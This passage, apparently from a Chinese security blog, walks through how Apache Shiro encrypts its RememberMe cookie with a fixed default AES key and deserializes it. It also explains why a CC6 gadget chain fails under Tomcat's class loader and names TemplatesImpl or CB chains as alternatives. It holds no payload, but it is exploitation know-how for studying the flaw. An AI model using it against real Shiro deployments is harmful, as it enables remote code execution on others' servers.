+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">rememberSerializedIdentity:<span class="hljs-number">137</span>, CookieRememberMeManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.web</span>.mgt)<br>rememberIdentity:<span class="hljs-number">347</span>, AbstractRememberMeManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>rememberIdentity:<span class="hljs-number">321</span>, AbstractRememberMeManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>onSuccessfulLogin:<span class="hljs-number">297</span>, AbstractRememberMeManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>rememberMeSuccessfulLogin:<span class="hljs-number">206</span>, DefaultSecurityManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>onSuccessfulLogin:<span class="hljs-number">291</span>, DefaultSecurityManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>login:<span class="hljs-number">285</span>, DefaultSecurityManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>login:<span class="hljs-number">256</span>, DelegatingSubject (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.subject</span>.support)<br>executeLogin:<span class="hljs-number">53</span>, AuthenticatingFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.filter</span>.authc)<br></code></pre></td></tr></table></figure>
+
+<p>这也符合我们在入门时的分析，由 Filter 拦截到请求，交给 Subject 执行登录，会调用 SecurityManager 完成从 Realm 获取用户信息并判断登录是否成功</p>
+<p>我们接着看上图 rememberSerializedIdentity 这个方法，后续流程就是把 serialized 参数，进行 base64 编码，设置到 cookie 中</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418162158232.png" srcset="/img/loading.gif" lazyload alt="image-20250418162158232"></p>
+<p>我们主要得分析 <code>serialized</code> 参数，是如何得来的</p>
+<p>在 上一层调用栈 <code>rememberIdentity:347, AbstractRememberMeManager (org.apache.shiro.mgt)</code> 中看到 serialized 参数就是用户表示序列化后加密得到的</p>
+<center>
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250418154829591.png" srcset="/img/loading.gif" lazyload alt="image-20250418154829591" width=450px/>
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250418154957897.png" srcset="/img/loading.gif" lazyload alt="image-20250418154829591" width=450px/>
+</center>
+
+<p>跟一下加密这个函数 看到要获取 CipherService 这个加密服务类，调用它对应的 encrypt 方法进行加密</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] encrypt(<span class="hljs-type">byte</span>[] serialized) &#123;<br>        <span class="hljs-type">byte</span>[] value = serialized;<br>        <span class="hljs-type">CipherService</span> <span class="hljs-variable">cipherService</span> <span class="hljs-operator">=</span> getCipherService();<br>        <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ByteSource</span> <span class="hljs-variable">byteSource</span> <span class="hljs-operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());<br>            value = byteSource.getBytes();<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是这个加密服务的实现类有 6 个，我们不确定是哪一个</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418162648596.png" srcset="/img/loading.gif" lazyload alt="image-20250418162648596"></p>
+<p>我们在 org.apache.shiro.mgt.AbstractRememberMeManager#encrypt 函数打个断点，在发一次包，看看是调用的那个加密服务</p>
+<p>看到调用的 AES 加密</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418163413548.png" srcset="/img/loading.gif" lazyload alt="image-20250418163413548"></p>
+<p>AES 加密就只需要明文和密钥，密钥就是 getEncryptionCipherKey() 这个方法获取的</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164320179.png" srcset="/img/loading.gif" lazyload alt="image-20250418164320179"></p>
+<p>我们跟一下这个方法，看密钥是如何生成的。看到 get 方法直接 return 了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getEncryptionCipherKey() &#123;<br>    <span class="hljs-keyword">return</span> encryptionCipherKey;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们找一下 encryptionCipherKey 的 setter 方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164529148.png" srcset="/img/loading.gif" lazyload alt="image-20250418164529148"></p>
+<p>看看谁在调用它，给 encryptionCipherKey 赋值</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164707431.png" srcset="/img/loading.gif" lazyload alt="image-20250418164707431"></p>
+<p>找到了 AbstractRememberMeManager#setCipherKey 方法，<span style="color:#CC0000;"> 看到加密的 key 和解密的 key 是一个 </span></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164758838.png" srcset="/img/loading.gif" lazyload alt="image-20250418164758838"></p>
+<p>继续找一下 setCipherKey 的调用</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164839829.png" srcset="/img/loading.gif" lazyload alt="image-20250418164839829"></p>
+<p>找到了 AbstractRememberMeManager 的构造方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164912359.png" srcset="/img/loading.gif" lazyload alt="image-20250418164912359"></p>
+<p>看到设置的是一个常量 DEFAULT_CIPHER_KEY_BYTES，也很好定位到</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418165053370.png" srcset="/img/loading.gif" lazyload alt="image-20250418165053370"></p>
+<h4 id="加密小结"><a href="#加密小结" class="headerlink" title="加密小结"></a>加密小结</h4><p>把用户的身份表示 principals 序列化后，用固定的 key 进行了 AES 加密，设置到了 cookie 的 RememberMe 中</p>
+<h4 id="RememberMe-解密"><a href="#RememberMe-解密" class="headerlink" title="RememberMe 解密"></a>RememberMe 解密</h4><p>我们发送带有 RememberMe 字段的请求</p>
+<blockquote>
+<p>注意要删除 JSESSIONID 字段</p>
+<p>其实这也很好理解，因为 JSESSIONID 是会话标识，表明当前请求绑定的活动会话，也就是说当前回话还没有断开。</p>
+<p>而 RememberMe 是“免登录”凭据，及回话断开后，下次访问免登录的设置</p>
+</blockquote>
+<p>在 CookieRememberMeManager 中有 getRememberedSerializedIdentity 方法，我们把断点下在这里，跟一下</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418183935346.png" srcset="/img/loading.gif" lazyload alt="image-20250418183935346"></p>
+<p>return 出来后，来到 AbstractRememberMeManager#getRememberedPrincipals 方法，解析二进制的 byte 流，转化为 principals</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418184217097.png" srcset="/img/loading.gif" lazyload alt="image-20250418184217097"></p>
+<p>我们跟进这个 convertBytesToPrincipals 方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418184329300.png" srcset="/img/loading.gif" lazyload alt="image-20250418184329300"></p>
+<p>看一下 decrypt</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418184454169.png" srcset="/img/loading.gif" lazyload alt="image-20250418184454169"></p>
+<p>看一下 decrypt 会来到 JcaCipherService#decrypt 这个实现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ByteSource <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ciphertext, <span class="hljs-type">byte</span>[] key)</span> <span class="hljs-keyword">throws</span> CryptoException &#123;<br><br>       <span class="hljs-type">byte</span>[] encrypted = ciphertext;<br><br>       <span class="hljs-comment">//No IV, check if we need to read the IV from the stream:</span><br>       <span class="hljs-type">byte</span>[] iv = <span class="hljs-literal">null</span>;<br><br>       <span class="hljs-keyword">if</span> (isGenerateInitializationVectors(<span class="hljs-literal">false</span>)) &#123;<br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-comment">//We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it</span><br>               <span class="hljs-comment">//is:</span><br>               <span class="hljs-comment">// - the first N bytes is the initialization vector, where N equals the value of the</span><br>               <span class="hljs-comment">// &#x27;initializationVectorSize&#x27; attribute.</span><br>               <span class="hljs-comment">// - the remaining bytes in the method argument (arg.length - N) is the real cipher text.</span><br><br>               <span class="hljs-comment">//So we need to chunk the method argument into its constituent parts to find the IV and then use</span><br>               <span class="hljs-comment">//the IV to decrypt the real ciphertext:</span><br><br>               <span class="hljs-type">int</span> <span class="hljs-variable">ivSize</span> <span class="hljs-operator">=</span> getInitializationVectorSize();<br>               <br>               <span class="hljs-type">int</span> <span class="hljs-variable">ivByteSize</span> <span class="hljs-operator">=</span> ivSize / BITS_PER_BYTE; <span class="hljs-comment">// ivByteSize = 16</span><br><br>               <span class="hljs-comment">//now we know how large the iv is, so extract the iv bytes:</span><br>               iv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[ivByteSize];<br>               <span class="hljs-comment">// 把RememberMe的前16个字节复制到 iv 中</span><br>               System.arraycopy(ciphertext, <span class="hljs-number">0</span>, iv, <span class="hljs-number">0</span>, ivByteSize); <br><br>               <span class="hljs-comment">//remaining data is the actual encrypted ciphertext.  Isolate it:</span><br>               <span class="hljs-type">int</span> <span class="hljs-variable">encryptedSize</span> <span class="hljs-operator">=</span> ciphertext.length - ivByteSize;<br>               encrypted = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[encryptedSize];<br>               <span class="hljs-comment">// 把出去iv 的后续字节 复制到 encrypted 这个字节数组中</span><br>               System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="hljs-number">0</span>, encryptedSize);<br>           &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>               <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;</span>;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CryptoException</span>(msg, e);<br>           &#125;<br>       &#125;<br><span class="hljs-comment">// 再用encrypted、iv和key 做AES的解密</span><br>       <span class="hljs-keyword">return</span> decrypt(encrypted, key, iv);<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>接下来就是 deserialize 反序列化了，不过值得注意的是 这个 inputStream 流对象是 ClassResolvingObjectInputStream </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418184648233.png" srcset="/img/loading.gif" lazyload alt="image-20250418184648233"></p>
+<p>而 ClassResolvingObjectInputStream 这个类重写了 resolveClass 方法，所以在反序列化的过程中会走重写的 resolveClass，而不会走 ObjectInputStream 默认的 resolveClass 方法</p>
+<blockquote>
+<p>具体在 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LINGX5/p/18809006#hashmap-%E5%B0%81%E8%A3%85%E7%9A%84%E5%B7%A7%E7%94%A8">fastjson 原生反序列化链 - LingX5 - 博客园</a> 这片文章中讲到过</p>
+</blockquote>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418185421217.png" srcset="/img/loading.gif" lazyload alt="image-20250418185421217"></p>
+<p>看到调用的是 org.apache.shiro.util.ClassUtils#forName 而不是 JDK 的 java.lang.Class#forName(java.lang.String)方法</p>
+<p>可以看一下 ClassUtils#forName 这个方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class <span class="hljs-title function_">forName</span><span class="hljs-params">(String fqcn)</span> <span class="hljs-keyword">throws</span> UnknownClassException &#123;<br><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> THREAD_CL_ACCESSOR.loadClass(fqcn);<br><br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>            log.trace(<span class="hljs-string">&quot;Unable to load class named [&quot;</span> + fqcn +<br>                      <span class="hljs-string">&quot;] from the thread context ClassLoader.  Trying the current ClassLoader...&quot;</span>);<br>        &#125;<br>        clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>            log.trace(<span class="hljs-string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="hljs-string">&quot;] from the current ClassLoader.  &quot;</span> +<br>                      <span class="hljs-string">&quot;Trying the system/application ClassLoader...&quot;</span>);<br>        &#125;<br>        clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="hljs-string">&quot;] from the thread context, current, or &quot;</span> +<br>            <span class="hljs-string">&quot;system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.&quot;</span>;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnknownClassException</span>(msg);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其内部实现，就是调用了 <code>ClassLoader.loadClass() 的方式</code> 进行类加载，ClassLoader.loadClass()这种方式无法加载数组类型的。<span style="color:#FF0000;">（但是这里也不是纯正的 ClassLoader.loadClass，这里会涉及到 tomcat 的类加载委派机制）</span></p>
+<p>而 java.lang.Class#forName 会去调用 forName0() 这个 native 方法，利用 JVM 的内部机制，能够识别数组类的特殊命名格式</p>
+<p>但是在这里是 tomcat 的环境，本质上是调用的 Tomcat 的 <strong>Webapp ClassLoader</strong>，后边还是会委托给 Class#forName 加载 <strong>外部的数组类型 <code>（Transformer[]）</code></strong>，由于委托的父类加载器 URLClassLoader 的搜索路径没有 CommonsCollections 这个依赖，所以会加载失败。</p>
+<p>所以在进行传统 CC 链攻击的时候，由于无法加载 Transformer [] 这个数组类型，会抛出异常</p>
+<p>我们可以利用 TemplatesImpl 或者 CB 链来实现攻击</p>
+<h4 id="CC6-失败的原因"><a href="#CC6-失败的原因" class="headerlink" title="CC6 失败的原因"></a>CC6 失败的原因</h4><p>加入 tomcat 的依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-embed-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.0.109<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>我们来看一下调试看一下这个类加载过程</p>
+<blockquote>
+<p>  Class clazz &#x3D; THREAD_CL_ACCESSOR.loadClass(fqcn);</p>
+</blockquote>
+<p>步入就来到了 ClassUtils.ExceptionIgnoringAccessor#loadClass 这个方法，看到 getClassLoader 就是 tomcat 的 WebappClassLoader</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420093552991.png" srcset="/img/loading.gif" lazyload alt="image-20250420093552991"></p>
+<p>我们接着步入 来到 org.apache.catalina.loader.WebappClassLoaderBase#loadClass 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 加载指定名称的类，并根据需要解析该类。</span><br><span class="hljs-comment">     * 此方法会尝试从多个位置加载类，包括缓存、J2SE 类加载器、父类加载器和本地仓库。</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-type">boolean</span> resolve) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    <span class="hljs-comment">// 获取类加载锁并进行同步，确保线程安全</span><br>    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.getClassLoadingLockInternal(name)) &#123;<br>        <span class="hljs-comment">// 标记是否委托给父类加载器加载类，一般为false</span><br>        <span class="hljs-type">boolean</span> delegateLoad;<br>        <span class="hljs-comment">// 标签用于跳出多层嵌套的代码块</span><br>        label220: &#123;<br>            <span class="hljs-comment">// 如果调试日志启用，记录加载类的信息</span><br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                log.debug(<span class="hljs-string">&quot;loadClass(&quot;</span> + name + <span class="hljs-string">&quot;, &quot;</span> + resolve + <span class="hljs-string">&quot;)&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-comment">// 用于存储加载的类对象</span><br>            Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br>            <span class="hljs-comment">// 检查类加载器是否已停止</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.started) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">// 若已停止，抛出 IllegalStateException</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>();<br>                &#125; <span class="hljs-keyword">catch</span> (IllegalStateException e) &#123;<br>                    <span class="hljs-comment">// 记录类加载器已停止的日志</span><br>                    log.info(sm.getString(<span class="hljs-string">&quot;webappClassLoader.stopped&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;name&#125;), e);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 尝试从自定义的缓存中查找已加载的类</span><br>            clazz = <span class="hljs-built_in">this</span>.findLoadedClass0(name);<br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 如果在缓存中找到类，记录日志</span><br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    log.debug(<span class="hljs-string">&quot;  Returning class from cache&quot;</span>);<br>                &#125;<br>                <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                <span class="hljs-keyword">if</span> (resolve) &#123;<br>                    <span class="hljs-built_in">this</span>.resolveClass(clazz);<br>                &#125;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br><br>            <span class="hljs-comment">// 尝试从 Java 标准的缓存中查找已加载的类</span><br>            clazz = <span class="hljs-built_in">this</span>.findLoadedClass(name);<br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 如果在缓存中找到类，记录日志</span><br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    log.debug(<span class="hljs-string">&quot;  Returning class from cache&quot;</span>);<br>                &#125;<br>                <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                <span class="hljs-keyword">if</span> (resolve) &#123;<br>                    <span class="hljs-built_in">this</span>.resolveClass(clazz);<br>                &#125;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 尝试使用 J2SE 类加载器加载类</span><br>                clazz = <span class="hljs-built_in">this</span>.j2seClassLoader.loadClass(name);<br>                <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                    <span class="hljs-keyword">if</span> (resolve) &#123;<br>                        <span class="hljs-built_in">this</span>.resolveClass(clazz);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var11) &#123;<br>                <span class="hljs-comment">// 忽略类未找到异常，继续尝试其他加载方式</span><br>            &#125;<br><br>            <span class="hljs-comment">// 如果安全管理器存在</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.securityManager != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 此处存在逻辑错误，原代码想获取包名索引，应改为 name.lastIndexOf(&#x27;.&#x27;)</span><br>                delegateLoad = name.lastIndexOf(<span class="hljs-string">&#x27;.&#x27;</span>) &gt;= <span class="hljs-number">0</span>; <br>                <span class="hljs-keyword">if</span> (delegateLoad) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">// 检查是否有权限访问该包</span><br>                        <span class="hljs-built_in">this</span>.securityManager.checkPackageAccess(name.substring(<span class="hljs-number">0</span>, name.lastIndexOf(<span class="hljs-string">&#x27;.&#x27;</span>)));<br>                    &#125; <span class="hljs-keyword">catch</span> (SecurityException var9) &#123;<br>                        <span class="hljs-comment">// 记录安全违规日志</span><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">error</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Security Violation, attempt to use Restricted Class: &quot;</span> + name;<br>                        <span class="hljs-keyword">if</span> (name.endsWith(<span class="hljs-string">&quot;BeanInfo&quot;</span>)) &#123;<br>                            log.debug(error, var9);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            log.info(error, var9);<br>                        &#125;<br>                        <span class="hljs-comment">// 抛出类未找到异常</span><br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(error, var9);<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 判断是否委托给父类加载器加载类</span><br>            delegateLoad = <span class="hljs-built_in">this</span>.delegate || <span class="hljs-built_in">this</span>.filter(name);<br>            <span class="hljs-keyword">if</span> (delegateLoad) &#123;<br>                <span class="hljs-comment">// 如果需要委托，记录日志</span><br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    log.debug(<span class="hljs-string">&quot;  Delegating to parent classloader1 &quot;</span> + <span class="hljs-built_in">this</span>.parent);<br>                &#125;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">// 尝试使用父类加载器加载类</span><br>                    clazz = Class.forName(name, <span class="hljs-literal">false</span>, <span class="hljs-built_in">this</span>.parent);<br>                    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-comment">// 如果加载成功，记录日志</span><br>                        <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                            log.debug(<span class="hljs-string">&quot;  Loading class from parent&quot;</span>);<br>                        &#125;<br>                        <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                        <span class="hljs-keyword">if</span> (resolve) &#123;<br>                            <span 